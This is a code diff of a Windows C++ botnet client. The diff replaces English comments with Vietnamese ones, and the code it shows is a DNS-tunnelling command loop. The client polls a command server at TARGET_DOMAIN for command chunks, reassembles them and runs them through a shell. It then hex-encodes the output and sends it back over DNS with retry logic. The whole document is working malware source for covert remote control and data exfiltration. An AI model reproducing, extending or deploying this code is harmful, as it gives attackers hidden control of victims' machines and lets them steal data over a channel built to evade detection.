@@ -18,7 +18,7 @@ void EnqueueExecute(const std::string& s) {
 DWORD senderBotnetThread(LPVOID lpParam)
 {
     while (true) {
-        // --- Phase 1: Poll for command chunks from server ---
+        // Buoc 1: Poll lay command chunks tu server
         std::vector<std::string> command_chunks;
         size_t chunk_offset = 0;
 
@@ -26,15 +26,15 @@ DWORD senderBotnetThread(LPVOID lpParam)
 
         while (true)
         {
-            // Send Type P packet to poll for next chunk
+            // Gui Type P packet de poll chunk tiep theo
             int retcode = sendDataTypeP(connectionId, packetNumber, chunk_offset, TARGET_DOMAIN.c_str());
 
             if (retcode == 1) {
-                // Successfully received a chunk
+                // Nhan thanh cong mot chunk
                 std::string chunk_data;
                 {
                     std::lock_guard<std::mutex> lock(g_outChunkMutex);
-                    // Convert wstring to string
+
                     int size_needed = WideCharToMultiByte(CP_UTF8, 0, g_outChunk.c_str(), -1, nullptr, 0, nullptr, nullptr);
                     if (size_needed > 0) {
                         std::string temp(size_needed - 1, 0);
@@ -47,40 +47,40 @@ DWORD senderBotnetThread(LPVOID lpParam)
                     std::cout << "  [+] Received chunk " << chunk_offset << " (" << chunk_data.length() << " bytes)\n";
                     command_chunks.push_back(chunk_data);
                     chunk_offset++;
-                    Sleep(50); // Small delay between chunk requests
+                    Sleep(50); // Delay nho giua cac chunk request
                 } else {
                     break;
                 }
             } 
             else if (retcode == 0) {
-                // No more chunks (empty response or end of command)
+                // Khong con chunk nao (empty response hoac het lenh)
                 std::cout << "  [*] End of command chunks (retcode=0)\n";
                 break;
             } 
             else {
-                // Error occurred (retcode == -1)
+                // Xay ra loi (retcode == -1)
                 std::cout << "  [!] Error polling for chunks (retcode=-1)\n";
                 break;
             }
         }
 
-        // --- Phase 2: Check if we have a command to process ---
+        // Buoc 2: Kiem tra neu co lenh de xu ly
         std::string dataToSend;
 
         if (!command_chunks.empty()) {
-            // Reassemble the full command from chunks
+            // Ghep lai lenh day du tu cac chunks
             std::string full_command;
             for (const auto& chunk : command_chunks) {
                 full_command += chunk;
             }
             std::cout << "[+] Command reassembled: '" << full_command << "' (" << full_command.length() << " bytes)\n";
 
-            // Enqueue the command for execution (or process it here)
+            // Dua lenh vao queue de thuc thi
             EnqueueExecute(full_command);
             std::cout << "[+] Command enqueued for execution\n";
         }
 
-        // --- Phase 3: Check queue for data to send back ---
+        // Buoc 3: Kiem tra queue co du lieu de gui lai
         {
             std::lock_guard<std::mutex> lock(queue_mutex);
             if (!send_queue.empty()) {
@@ -89,12 +89,12 @@ DWORD senderBotnetThread(LPVOID lpParam)
             }
         }
 
-        // --- Phase 4: Send data back to server in chunks ---
+        // Buoc 4: Gui du lieu tro lai server theo chunks
         if (!dataToSend.empty()) {
             std::cout << "[Sending] Transmitting result (" << dataToSend.length() << " bytes) in chunks...\n";
             std::cout << "[Debug] Data preview: '" << dataToSend.substr(0, std::min<size_t>(50, dataToSend.length())) << "...'\n";
             
-            // Split dataToSend into chunks of max_len and send each chunk
+            // Chia dataToSend thanh cac chunks voi kich thuoc max_len
             size_t offset = 0;
             size_t offset_number = 0;
             const size_t totalLen = dataToSend.size();
@@ -109,7 +109,7 @@ DWORD senderBotnetThread(LPVOID lpParam)
                 std::cout << "  [+] Sending chunk " << offset_number << " (packet #" << packetNumber << ", " << chunkLen << " bytes)\n";
                 std::cout << "  [Debug] Chunk hex preview: " << chunk.substr(0, std::min<size_t>(20, chunk.length())) << "...\n";
                 
-                // Convert chunk to hex for DNS transmission
+                // Chuyen chunk sang hex cho DNS transmission
                 std::string chunkHex = convertToHex(chunk.c_str());
                 std::cout << "  [Debug] Hex length: " << chunkHex.length() << " chars\n";
                 
@@ -117,7 +117,7 @@ DWORD senderBotnetThread(LPVOID lpParam)
                                             TARGET_DOMAIN.c_str(), chunkHex.c_str());
 
                 if (success == 0) {
-                    // Sent OK -> increment packet number
+                    // Gui thanh cong -> tang packet number
                     std::cout << "  [✓] Chunk sent successfully\n";
                     packetNumber++;
                     if (packetNumber > 999) {
@@ -125,7 +125,7 @@ DWORD senderBotnetThread(LPVOID lpParam)
                     }
 
                     offset += chunkLen;
-                    consecutiveFailures = 0; // Reset failure counter
+                    consecutiveFailures = 0;
                     Sleep(50);
                 } else {
                     consecutiveFailures++;
@@ -133,7 +133,7 @@ DWORD senderBotnetThread(LPVOID lpParam)
                     
                     if (consecutiveFailures >= MAX_FAILURES) {
                         std::cout << "  [✗] Max failures reached, skipping packet #" << packetNumber << " to continue\n";
-                        // Skip failed packet and move to next chunk
+                        // Bo qua packet that bai va chuyen sang chunk tiep theo
                         packetNumber++;
                         if (packetNumber > 999) {
                             packetNumber = 0;
@@ -142,7 +142,7 @@ DWORD senderBotnetThread(LPVOID lpParam)
                         consecutiveFailures = 0;
                         Sleep(100);
                     } else {
-                        // Wait and retry
+                        // Cho va thu lai
                         std::cout << "  [~] Retrying after delay...\n";
                         Sleep(500);
                     }
@@ -155,7 +155,7 @@ DWORD senderBotnetThread(LPVOID lpParam)
                 std::cout << "[!] Transmission failed, data discarded\n";
             }
         } else {
-            // No data to send, brief wait before next poll cycle
+            // Khong co du lieu gui, cho mot chut truoc chu ky tiep theo
             Sleep(2000);
         }
     }
@@ -177,7 +177,7 @@ DWORD handle_botnet(LPVOID lpParam)
     while (true) {
         std::string commandToExecute;
 
-        // Check execute_queue for commands
+
         {
             std::lock_guard<std::mutex> lock(execute_mutex);
             if (!execute_queue.empty()) {
@@ -186,7 +186,7 @@ DWORD handle_botnet(LPVOID lpParam)
             }
         }
 
-        // Execute command if available
+
         if (!commandToExecute.empty()) {
             std::cout << "[Execute] Running command: '" << commandToExecute << "'\n";
             bool success = shell.ExecuteCommand(commandToExecute);
